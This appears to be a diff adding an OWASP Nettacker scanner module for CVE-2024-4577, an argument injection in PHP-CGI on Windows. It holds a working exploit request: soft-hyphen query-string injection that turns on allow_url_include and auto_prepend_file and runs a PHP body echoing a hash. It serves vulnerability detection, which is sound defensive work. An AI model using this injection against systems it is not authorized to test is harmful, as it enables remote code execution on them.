@@ -1,0 +1,67 @@
+info:
+  name: php_cgi_cve_2024_4577_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: >
+    CVE-2024-4577 is a critical argument injection vulnerability (CVSS 9.8) affecting PHP running
+    in CGI mode on Windows, commonly exposed by XAMPP installations. Due to the Windows Best-Fit
+    character encoding conversion, query string characters such as the soft hyphen (%AD) are
+    transformed into ASCII hyphens after URL decoding, allowing an unauthenticated remote attacker
+    to inject arbitrary PHP interpreter arguments (e.g. -d allow_url_include=1 combined with
+    -d auto_prepend_file=php://input) and achieve remote code execution. This flaw is actively
+    exploited in the wild and is listed in the CISA KEV catalog.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+    - https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+    - https://labs.watchtowr.com/no-sleep-bug-bounties-fishing-for-xampp-now-with-more-rce/
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2024
+    - cisa_kev
+    - php
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 15
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/x-www-form-urlencoded"
+        ssl: false
+        allow_redirects: false
+        data: "<?php echo(md5(233*3));?>"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{endpoint}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              endpoint:
+                # %AD (soft hyphen) is converted to an ASCII hyphen by Windows Best-Fit mapping,
+                # turning the query string into PHP CGI arguments:
+                # -d allow_url_include=1 -d auto_prepend_file=php://input
+                - "php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput"
+                - "test.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput"
+                - "index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "afd4836712c5e77550897e25711e1d96" # md5(233*3), echoed back only when RCE succeeds
+              reverse: false
